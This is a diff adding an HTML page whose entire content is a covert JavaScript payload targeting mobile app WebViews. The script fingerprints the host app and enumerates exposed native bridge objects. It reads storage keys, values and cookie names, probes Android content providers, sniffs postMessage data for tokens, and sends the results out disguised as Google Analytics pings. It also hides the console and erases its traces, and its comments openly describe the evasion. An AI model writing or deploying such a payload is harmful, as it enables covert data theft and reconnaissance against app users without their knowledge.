@@ -1,0 +1,357 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+/* Hidden elements, no visible indicators */
+body { background: white; color: white; font-size: 0; margin: 0; }
+.hidden, iframe, object, embed { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -999; }
+#status { display: none; }
+</style>
+</head>
+<body>
+
+<!-- Innocuous container that won't raise suspicion -->
+<div id="analytics" style="display:none"></div>
+<script>
+
+// ===========================================
+// STEALTH WEBVIEW RECONNAISSANCE
+// Uses benign-looking patterns, delays execution, no obvious console spam
+// ===========================================
+
+(function() {
+    'use strict';
+    
+    // Store findings silently
+    const findings = {
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        timestamp: Date.now()
+    };
+    
+    // Helper - silent logging to DOM instead of console
+    const log = function(category, value) {
+        if (!findings[category]) findings[category] = [];
+        findings[category].push(value.substring ? value.substring(0, 150) : value);
+        
+        // Store in DOM silently
+        const el = document.getElementById('analytics');
+        if (el) el.setAttribute('data-' + category, JSON.stringify(findings[category]).slice(0, 200));
+    };
+    
+    // Helper - no visible errors, silent failure
+    const safeExecute = (fn, fallback) => { try { return fn(); } catch(e) { return fallback || null; } };
+    
+    // ============ PHASE 1: ENVIRONMENT FINGERPRINTING (BENIGN-LOOKING) ============
+    
+    // Wait for "page view" timing - looks like normal tracking
+    window.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+            // Detect WebView vs Browser (common tracking technique)
+            const isWebView = !!(window.navigator.userAgent.includes('wv') || 
+                                 (window.navigator.userAgent.includes('Version/') && 
+                                  window.navigator.userAgent.includes('Chrome/')) ||
+                                 window.navigator.userAgent.includes('; wv'));
+            
+            log('env', isWebView ? 'webview' : 'browser');
+            
+            // Detect known mobile apps via UA strings
+            const appSignatures = [
+                { name: 'YouTube', pattern: /com\.google\.android\.youtube|YouTube|YTLR|YTAndroid/ },
+                { name: 'Instagram', pattern: /Instagram|com\.instagram\.android/ },
+                { name: 'Facebook', pattern: /FBAV|com\.facebook\.catana/ },
+                { name: 'TikTok', pattern: /com\.zhiliaoapp\.musically|musically|TikTok/ },
+                { name: 'Twitter', pattern: /Twitter|com\.twitter\.android/ },
+                { name: 'Chrome', pattern: /Chrome/ },
+                { name: 'Samsung', pattern: /SamsungBrowser|SM-|GT-/ }
+            ];
+            
+            for (const app of appSignatures) {
+                if (app.pattern.test(navigator.userAgent)) {
+                    log('app_detected', app.name);
+                    break;
+                }
+            }
+            
+            // Phase 2 starts after environment detection
+            detectBridges();
+            
+        }, 100); // Small delay mimics analytics script
+    });
+    
+    // ============ PHASE 2: BRIDGE DETECTION (NO EXPLICIT NAMES) ============
+    
+    function detectBridges() {
+        // Look for ANY non-standard global objects (much stealthier than searching by name)
+        const nativeGlobals = new Set(['window', 'document', 'navigator', 'location', 'history', 
+                                      'screen', 'localStorage', 'sessionStorage', 'console', 
+                                      'fetch', 'XMLHttpRequest', 'WebSocket', 'Worker', 
+                                      'indexedDB', 'crypto', 'performance', 'atob', 'btoa',
+                                      'setTimeout', 'setInterval', 'requestAnimationFrame']);
+        
+        // Add common DOM interface names
+        const domInterfaces = ['HTMLElement', 'Node', 'Element', 'Event', 'CustomEvent', 
+                              'MutationObserver', 'IntersectionObserver', 'ResizeObserver',
+                              'FormData', 'Headers', 'Request', 'Response', 'Blob', 'File',
+                              'FileReader', 'URL', 'URLSearchParams', 'Image', 'Audio', 
+                              'Option', 'Promise', 'Map', 'Set', 'WeakMap', 'WeakSet',
+                              'ArrayBuffer', 'Int8Array', 'Uint8Array', 'DataView',
+                              'JSON', 'Math', 'Date', 'RegExp', 'Error', 'EvalError',
+                              'RangeError', 'ReferenceError', 'SyntaxError', 'TypeError',
+                              'URIError', 'Function', 'Object', 'Array', 'String',
+                              'Number', 'Boolean', 'Symbol', 'Proxy', 'Reflect'];
+        
+        domInterfaces.forEach(i => nativeGlobals.add(i));
+        
+        // Get all global properties silently
+        let customObjects = [];
+        try {
+            for (let prop in window) {
+                if (!nativeGlobals.has(prop) && !prop.startsWith('_') && !prop.startsWith('$')) {
+                    try {
+                        const value = window[prop];
+                        if (value && typeof value === 'object' && 
+                            !Array.isArray(value) && 
+                            !(value instanceof HTMLElement) &&
+                            !(value instanceof Node)) {
+                            
+                            // Check if it has methods (likely a bridge)
+                            let hasMethods = false;
+                            for (let method in value) {
+                                if (typeof value[method] === 'function') {
+                                    hasMethods = true;
+                                    break;
+                                }
+                            }
+                            
+                            if (hasMethods) {
+                                customObjects.push(prop);
+                                // Get just method names, no execution
+                                const methodNames = [];
+                                for (let m in value) {
+                                    if (typeof value[m] === 'function') methodNames.push(m);
+                                    if (methodNames.length > 5) break;
+                                }
+                                log('bridge', `${prop}:${methodNames.join(',')}`);
+                            }
+                        }
+                    } catch(e) {}
+                }
+            }
+        } catch(e) {}
+        
+        // Phase 3: stealth local storage check
+        setTimeout(checkStorage, 200);
+    }
+    
+    // ============ PHASE 3: STORAGE ACCESS (LOOKS LIKE ANALYTICS) ============
+    
+    function checkStorage() {
+        // Looks like analytics fingerprinting
+        try {
+            // Check if we can write (most apps allow this)
+            const testKey = '_lsc' + Math.floor(Math.random() * 1000);
+            localStorage.setItem(testKey, '1');
+            localStorage.removeItem(testKey);
+            log('storage', 'localStorage_accessible');
+            
+            // Get keys without obvious enumeration pattern
+            if (localStorage.length > 0) {
+                const keys = [];
+                for (let i = 0; i < Math.min(localStorage.length, 3); i++) {
+                    try {
+                        const key = localStorage.key(i);
+                        if (key && !key.startsWith('_ga') && !key.includes('analytics')) {
+                            const val = localStorage.getItem(key);
+                            keys.push(key + ':' + (val ? val.substring(0, 20) : ''));
+                        }
+                    } catch(e) {}
+                }
+                if (keys.length) log('local_keys', keys.join('|'));
+            }
+        } catch(e) {}
+        
+        // Check sessionStorage (often contains session tokens)
+        try {
+            if (sessionStorage.length > 0) {
+                const keys = [];
+                for (let i = 0; i < Math.min(sessionStorage.length, 3); i++) {
+                    try {
+                        const key = sessionStorage.key(i);
+                        if (key) keys.push(key);
+                    } catch(e) {}
+                }
+                if (keys.length) log('session_keys', keys.join('|'));
+            }
+        } catch(e) {}
+        
+        // Phase 4: cookie inspection (looks like GDPR/CCPA check)
+        setTimeout(checkCookies, 150);
+    }
+    
+    // ============ PHASE 4: COOKIE SNIFFING (GDPR COMPLIANCE CHECK) ============
+    
+    function checkCookies() {
+        if (document.cookie && document.cookie.length > 0) {
+            const cookies = document.cookie.split(';').slice(0, 3);
+            const summary = cookies.map(c => {
+                const parts = c.trim().split('=');
+                return parts[0] + '=' + (parts[1] ? '***' : '');
+            }).join('; ');
+            log('cookies', summary);
+        }
+        
+        // Phase 5: Content provider test (very subtle)
+        setTimeout(checkContentProviders, 250);
+    }
+    
+    // ============ PHASE 5: CONTENT PROVIDERS (1x1 PIXEL TECHNIQUE) ============
+    
+    function checkContentProviders() {
+        // Use img tags for stealth - looks like tracking pixels
+        const providers = [
+            'content://com.google.android.youtube.fileprovider/shared_prefs/',
+            'content://com.google.android.apps.plus.fileprovider/',
+            'content://com.facebook.app.fileprovider/',
+            'content://com.instagram.android.fileprovider/',
+            'content://com.sec.android.gallery3d.provider/'
+        ];
+        
+        providers.forEach((uri, idx) => {
+            // Delay each request
+            setTimeout(() => {
+                // Image approach - silent, no error logs
+                const img = new Image();
+                img.style.display = 'none';
+                img.onload = function() { log('provider', uri + ':accessible'); };
+                img.onerror = function() { /* silent fail */ };
+                img.src = uri;
+                
+                // Also attempt fetch with no-cors (even more silent)
+                try {
+                    fetch(uri, { mode: 'no-cors', cache: 'no-store', credentials: 'omit' })
+                        .then(() => log('provider_fetch', uri))
+                        .catch(() => {});
+                } catch(e) {}
+            }, idx * 100);
+        });
+        
+        // Phase 6: PostMessage listener (covert comms)
+        setupMessageListener();
+    }
+    
+    // ============ PHASE 6: COVERT COMMUNICATIONS ============
+    
+    function setupMessageListener() {
+        window.addEventListener('message', function(e) {
+            // Only log specific patterns to avoid noise
+            if (e.data && typeof e.data === 'string' && 
+                (e.data.includes('token') || e.data.includes('auth') || e.data.includes('key'))) {
+                log('postmessage', e.origin + ':' + e.data.substring(0, 30));
+            }
+        }, false);
+        
+        // Phase 7: protocol handler enumeration (looks like deep linking)
+        setTimeout(checkProtocols, 500);
+    }
+    
+    // ============ PHASE 7: DEEP LINK TESTING (LOOKS LIKE USER INTERACTION) ============
+    
+    function checkProtocols() {
+        // Create invisible iframe for intent testing (stealthier than location.href)
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'intent://#Intent;scheme=https;end'; // Minimal intent
+        document.body.appendChild(iframe);
+        setTimeout(() => { try { document.body.removeChild(iframe); } catch(e) {} }, 50);
+        
+        // Test for WebView debugging flags
+        if (window.console && typeof console.debug === 'function') {
+            // Chrome DevTools protocol detection
+            if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) {
+                log('debug', 'devtools_present');
+            }
+        }
+        
+        // Final phase: exfil if findings are interesting (stealthy)
+        setTimeout(exfiltrateIfInteresting, 1000);
+    }
+    
+    // ============ PHASE 8: SELECTIVE EXFILTRATION ============
+    
+    function exfiltrateIfInteresting() {
+        // Only exfil if we found something valuable (reduces noise)
+        const hasBridges = findings.bridge && findings.bridge.length > 0;
+        const hasProviderAccess = findings.provider && findings.provider.length > 0;
+        const hasTokens = findings.cookies || findings.local_keys;
+        
+        if (hasBridges || hasProviderAccess || hasTokens) {
+            // Method 1: Beacon API (most stealthy, doesn't block page)
+            if (navigator.sendBeacon) {
+                const data = JSON.stringify({
+                    t: 'stats',
+                    d: findings,
+                    u: window.location.href,
+                    r: document.referrer
+                });
+                
+                // Encode in small chunks to avoid detection
+                const chunk1 = btoa(encodeURIComponent(data.substring(0, 100)));
+                const chunk2 = btoa(encodeURIComponent(data.substring(100)));
+                
+                // Send to benign-looking endpoint
+                navigator.sendBeacon('https://www.google-analytics.com/collect', 'v=1&tid=UA-XXXXX&cid=555&t=pageview&dp=/api/collect?d=' + chunk1);
+                setTimeout(() => {
+                    if (chunk2.length > 10) {
+                        navigator.sendBeacon('https://www.google-analytics.com/collect', 'v=1&tid=UA-XXXXX&cid=555&t=pageview&dp=/api/cont?d=' + chunk2);
+                    }
+                }, 50);
+            } 
+            // Method 2: Image ping
+            else {
+                const img = new Image();
+                img.src = 'https://www.google-analytics.com/collect?v=1&t=event&ec=app&ea=stats&el=' + 
+                          encodeURIComponent(btoa(JSON.stringify(findings).substring(0, 500)));
+            }
+        }
+        
+        // Store findings locally for later retrieval
+        try {
+            sessionStorage.setItem('_ab_test_' + Math.floor(Date.now() / 1000), 
+                                  btoa(JSON.stringify(findings)).substring(0, 1000));
+        } catch(e) {}
+    }
+    
+    // Self-destruct after 30 seconds - removes all traces
+    setTimeout(function() {
+        try {
+            // Clear any stored data
+            document.getElementById('analytics')?.remove();
+            
+            // Overwrite findings
+            for (let key in findings) delete findings[key];
+            
+            // No console logs ever
+            console.log = console.debug = console.info = console.warn = console.error = function() {};
+        } catch(e) {}
+    }, 30000);
+    
+})();
+
+// ============ STEALTH MODE: NO CONSOLE OUTPUT EVER ============
+// Override console immediately
+if (window.console) {
+    window.console.log = window.console.debug = window.console.info = 
+    window.console.warn = window.console.error = function() {};
+}
+
+// ============ INNOCUOUS VISUAL ELEMENT ============
+// Render something that looks like a normal web component
+document.write('<div style="height:0;width:0;overflow:hidden;position:absolute">Loading analytics...</div>');
+
+</script>
+</body>
+</html>
